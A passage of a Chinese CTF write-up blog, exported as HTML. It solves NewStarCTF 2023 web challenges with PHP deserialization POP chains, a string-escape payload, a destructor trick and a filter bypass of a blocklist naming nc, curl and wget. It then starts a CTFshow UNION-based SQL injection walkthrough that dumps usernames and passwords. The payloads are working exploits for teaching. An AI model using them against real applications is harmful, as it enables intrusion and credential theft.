class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>我们可以分析发现，由<code>Begin-&gt;name</code>的字符比较触发<code>__toString</code>，<code>__toString</code>中将类当做函数使用触发<code>__invoke</code>，<code>__invoke</code>中访问不存在的函数触发<code>__call</code>，由<code>__call</code>触发<code>end</code>，最后调用<code>unset</code>访问不可访问的属性触发<code>__unset</code>,通过__unset方法中的操作可以进行命令执行，但是要注意的是，保护属性和私有属性必须在类内访问，类外不可访问，最后序列化出来的字符串可以通过url编码的形式绕过保护属性和私有属性的检查。exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=<span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj=<span class="keyword">new</span> <span class="title class_">Ctf</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj=<span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle=<span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&quot;ls /;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$begin</span>=<span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$begin</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A14%3A%22ls+%2F%3Bcat+%2Fflag%22%3B%7D%7D%7D%7D%7D%7D</span></span><br></pre></td></tr></table></figure><h2 id="R-C-E-2"><a href="#R-C-E-2" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是exec命令执行函数，由于这个函数在执行命令后不会输出，可以用tee命令将其命令结果写在文件里，用法：<code>exec(&quot;ls / | tee x&quot;)</code>:将根目录文件名写进x文件里，这里过滤了tee，可以用<code>&#39;&#39;</code>绕过，exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee h&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();<span class="comment">//创建两次是为了在第一次销毁时，触发第二次里的__toString函数</span></span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);<span class="comment">//O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:30:&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee h&quot;;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:30:&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee h&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/10/02/NewStarCTF2023-web/w3.4-1.png"></p><h2 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h2><p>首先根据提示，在网络中找到需要访问的路径为<code>secr3tofpop</code>，提示通过get方式给name传参，尝试ssti注入，发现有waf，直接fenjing一把梭</p><p><img src="/2023/10/02/NewStarCTF2023-web/w3.5-1.png"></p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure><p>关键函数：<code>str_replace</code>，典型的反序列化字符串逃逸，传入的字符串通过控制bad数量，顶出我们需要的代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">// function waf($str)&#123;</span></span><br><span class="line"><span class="comment">//     return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// class GetFlag &#123;</span></span><br><span class="line"><span class="comment">//     public $key;</span></span><br><span class="line"><span class="comment">//     public $cmd = &quot;cat /flag&quot;;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $a=new GetFlag();</span></span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>);</span><br></pre></td></tr></table></figure><p>已知<code>&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag</code>长度为29，顶出29个字符即可，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>)</span><br></pre></td></tr></table></figure><p>很简单的反序列化，但是注意在最后<code>throw new Exception(&quot;Nope&quot;)</code>，反序列化后会扔出一个异常，此时对象还未销毁，所以<code>__destruct()</code>函数还未得以触发，在php中，当对象被销毁时会自动调用<code>__destruct()</code>方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。</p><p>当一个类创建之后它会自己消失，而 <code>__destruct()</code> 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。</p><p>我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒<code>__destruct()</code>魔术方法。那么这里有三种方法：</p><ul><li>将属性增加，与绕过<code>__wakeup()</code>函数相似</li><li>将序列化后的字符串删除一个}</li><li>将链子放进一个数组再序列化，最后将数组键值乱序即可（如：数组下标为0、1、2，随意修改一个下标即可）</li></ul><p>原理都一样，总之就是提前引出错误，触发垃圾回收机制，这样throw就不会再回收自动销毁的类了。</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//方法1</span><br><span class="line">fast=O:5:&quot;Start&quot;:2:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">//方法2</span><br><span class="line">fast=O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;</span><br><span class="line">//方法3</span><br><span class="line">fast=a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;&#125;i:1;i:0;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛事复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow</title>
      <link href="/2023/06/04/CTFshow/"/>
      <url>/2023/06/04/CTFshow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>简单签到</p><h2 id="web2（简单sql注入）"><a href="#web2（简单sql注入）" class="headerlink" title="web2（简单sql注入）"></a>web2（简单sql注入）</h2><p>简单的sql注入，按照步骤来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">假设题目的要求是拿到所有的username和password的值</span><br><span class="line">id=1 order by 1--+       #这里是查看列的数量</span><br><span class="line">id=0 union select 1,2,3--+   #查看显示位</span><br><span class="line">假设显示位仅有3，那么可以在3处去注入获取想要的信息，如：</span><br><span class="line">id=0 union select 1,2,database()--+   #查看数据库名称,假设查找到的数据库名为mysql</span><br><span class="line">id=0 union select 1,2,version()--+    #查看数据库版本信息</span><br><span class="line">id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;mysql&#x27;--+   #查找mysql数据库中所有的表名，group_concat()函数的作用是将所有查找到的项都连接起来，否则只能查到一个,假设查到重要的表为users</span><br><span class="line">id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+    #查到users表中所有字段即列的名字,假设查到列中有username和password</span><br><span class="line">id=0 union select 1,2,group_concat(username,password) from users      #从users这个表中获取到所有的username和password的值</span><br></pre></td></tr></table></figure><h2 id="web3（PHP伪协议）"><a href="#web3（PHP伪协议）" class="headerlink" title="web3（PHP伪协议）"></a>web3（PHP伪协议）</h2><p>先了解什么是<a 